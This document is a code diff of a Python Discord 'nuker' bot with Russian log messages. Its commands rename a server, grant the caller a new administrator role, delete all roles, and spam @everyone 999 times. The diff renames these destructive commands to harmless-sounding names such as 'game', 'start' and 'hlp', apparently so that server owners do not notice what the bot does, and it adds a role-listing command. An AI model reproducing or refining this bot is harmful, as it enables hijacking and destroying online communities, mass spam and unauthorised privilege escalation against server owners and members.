@@ -30,7 +30,7 @@ async def on_ready():
 {Fore.RED} Полное адище начинается ;)""")
 
 @client.command()
-async def lol(ctx):
+async def hlp(ctx):
     await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
     await ctx.guild.edit(name="Концерт фейса")
     print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
@@ -101,7 +101,7 @@ async def lol(ctx):
     print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
    
 @client.command()
-async def upme(ctx, pos: int):
+async def game(ctx, pos: int):
     try:
         await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
         role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
@@ -112,7 +112,7 @@ async def upme(ctx, pos: int):
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
 
 @client.command()
-async def delroles(ctx):
+async def start(ctx):
   roles = ctx.guild.roles
   roles.pop(0)
   for role in roles:
@@ -124,12 +124,19 @@ async def delroles(ctx):
   print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")
 
 @client.command()
-async def spam(ctx):
+async def ml(ctx):
     await ctx.message.delete()
     for s in range(999):
         await ctx.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим...")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Заспамили!")
+
+@client.command()
+async def gamehelp(ctx):
+    for role in ctx.guild.roles:
+     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Нашел роль {role}")
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Все роли найдены")
+
     
 
 
